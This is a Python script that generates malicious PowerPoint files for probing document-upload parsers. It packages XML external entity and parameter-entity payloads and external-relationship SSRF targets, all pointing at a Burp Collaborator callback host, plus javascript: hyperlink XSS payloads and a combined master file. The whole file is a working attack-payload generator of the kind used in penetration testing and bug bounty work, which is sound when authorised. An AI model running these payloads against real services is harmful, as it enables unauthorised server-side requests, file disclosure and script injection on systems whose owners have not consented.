from pathlib import Path
import zipfile
import tempfile

def generate_pptx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    xss_dir = output_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    
    pptx_xxe1_doctype = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-pptx-1">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = xxe_dir / "xxe1_doctype.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe1_doctype)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_xxe2_parameter = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-pptx-2">
%xxe;
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = xxe_dir / "xxe2_parameter.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe2_parameter)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_ssrf1_http = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = ssrf_dir / "ssrf1_http.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="{base_url}/ssrf-pptx-1" TargetMode="External"/>
</Relationships>''')
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf1_http)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_ssrf2_https = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = ssrf_dir / "ssrf2_https.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="https://{burp_collab}/ssrf-pptx-2" TargetMode="External"/>
</Relationships>''')
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf2_https)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_xss1_hyperlink = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = xss_dir / "xss1_hyperlink_js.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xss1_hyperlink)
        (temp_path / "ppt" / "slides").mkdir()
        (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>=HYPERLINK("javascript:alert(1)","click")</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_xss2_href = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = xss_dir / "xss2_href_js.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xss2_href)
        (temp_path / "ppt" / "slides").mkdir()
        (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>click</a:t>
</a:r>
</a:p>
</p:txBody>
<a:hlinkClick r:id="rIdXSS" action="javascript:alert(1)"/>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
        
        (temp_path / "ppt" / "slides" / "_rels").mkdir()
        (temp_path / "ppt" / "slides" / "_rels" / "slide1.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rIdXSS" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:alert(1)" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    master_file = output_dir / "master.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="{base_url}/ssrf-pptx-master" TargetMode="External"/>
</Relationships>''')
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe1_doctype)
        
        with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
